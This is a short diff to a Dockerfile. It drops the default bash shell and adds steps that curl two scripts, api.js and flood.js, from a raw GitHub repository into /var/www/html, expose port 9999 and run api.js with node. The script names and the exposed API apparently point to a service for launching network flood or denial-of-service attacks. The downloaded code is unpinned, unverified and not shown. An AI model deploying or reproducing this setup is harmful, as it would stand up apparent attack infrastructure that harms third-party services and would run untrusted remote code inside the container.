@@ -14,5 +14,16 @@ RUN apt update -y && apt install -y --no-install-recommends \
     && apt clean \
     && rm -rf /var/lib/apt/lists/*
 
-# Set the default shell to bash
-CMD ["/bin/bash"]
+# Create default directory and set it as the working directory
+RUN mkdir -p /var/www/html
+WORKDIR /var/www/html
+
+# Download the API scripts to the working directory
+RUN curl -o /var/www/html/api.js https://raw.githubusercontent.com/neganok/API/main/api.js \
+    && curl -o /var/www/html/flood.js https://raw.githubusercontent.com/neganok/API/main/flood.js
+
+# Expose port 9999
+EXPOSE 9999
+
+# Set the default command to run the API script
+CMD ["node", "/var/www/html/api.js"]
